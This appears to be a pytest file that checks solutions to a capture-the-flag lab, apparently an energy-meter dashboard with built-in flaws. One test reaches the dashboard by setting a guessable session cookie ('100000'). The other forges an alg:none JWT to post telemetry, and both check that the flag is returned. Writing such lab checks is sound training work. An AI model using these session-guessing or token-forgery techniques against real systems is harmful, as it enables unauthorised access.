SESSIONID_TEACH = "FLAG{COUNTING_SHEEP}"   # guessable session token, baseline value 100000
JWT_EXERCISE = "FLAG{FORGED_PAPERS}"       # device JWT, alg:none bypass


def test_sessionid_teach_guessable_token(anon_session, base_url):
    anon_session.cookies.set("wgs_session", "100000")
    resp = anon_session.get(f"{base_url}/dashboard", timeout=10)
    assert resp.status_code == 200
    assert SESSIONID_TEACH in resp.text


def test_jwt_exercise_alg_none(anon_session, base_url, forge_none_alg_jwt_fn):
    forged = forge_none_alg_jwt_fn("MTR-1001")
    resp = anon_session.post(
        f"{base_url}/api/telemetry",
        headers={"Authorization": f"Bearer {forged}"},
        json={"reading_kwh": 1.23},
        timeout=10,
    )
    assert resp.status_code == 200
    assert resp.json().get("flag") == JWT_EXERCISE
